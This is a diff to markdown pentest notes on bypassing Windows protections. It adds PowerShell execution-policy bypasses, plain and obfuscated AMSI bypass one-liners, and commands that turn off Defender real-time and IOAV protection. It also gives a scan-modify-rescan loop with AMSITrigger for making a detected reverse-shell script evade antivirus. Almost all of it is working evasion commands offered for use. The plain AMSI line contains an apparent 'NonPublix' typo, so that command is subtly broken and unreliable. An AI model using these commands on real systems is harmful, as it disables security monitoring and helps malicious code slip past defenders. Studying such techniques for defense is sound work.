@@ -1,9 +1,24 @@
 ## Tricks to Bypass protections
 
+### Execution Policy Protection
+---
+```powershell
+C:> powershell -ExecutionPolicy bypass
+C:> powershell -c <cmd>
+C:> powershell -encodedcommand
+C:> $env:PSExecutionPolicyPreference = "bypass"
+```
 
 ### AMSI Bypass
 ---
-
+Plain:
+```powershell
+C:> "[Ref].Assembly.GetType('System.MAnagement.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublix,Static').SetValue($null,$true)"
+```
+Obfuscation:
+```powershell
+C:> sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+```
 
 #### Use of `Invisi Shell`
 ---
@@ -22,7 +37,28 @@ C:> RunWithRegistryNonAdmin.bat
 ---
 Admin Privileges Required
 ```powershell
-Set-MpPreference -DisableIOAVProtection $true
-Set-MpPreference -Disablerealtimemonitoring $true
-"[Ref].Assembly.GetType('System.MAnagement.Automation.AmsiUtils').GetField('amsilnitFailed','NonPublix,Static').SetValue($null,$true)"
+C:> Set-MpPreference -DisableIOAVProtection $true
+C:> Set-MpPreference -Disablerealtimemonitoring $true
+C:> "[Ref].Assembly.GetType('System.MAnagement.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublix,Static').SetValue($null,$true)"
 ```
+### AMSI Trigger
+---
+To identify the part of a PowerShell script that is detected by AV. 
+Simply provide the path to the script file to scan:
+```powershell
+C:> AmsiTrigger_x64.exe -i C: AD Tools Invoke PowerShellTcp_Detected.ps1
+```
+Steps:
+- Scan using the tool
+- Modify code snippet
+- Reescan
+- Repeat until we get as result "AMSI_RESULT_NOT_DETECTED" or "Blank"
+
+### References
+---
+- [Pentest Laboratories](https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/): Ways to Bypass AMSI
+- [AMSI Trigger](https://github.com/RythmStick/AMSITrigger)
+- [Invoke Obfuscation](https://github.com/danielbohannon/Invoke Obfuscation)
+- [S3cur3Th1sSh1t](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
+
+
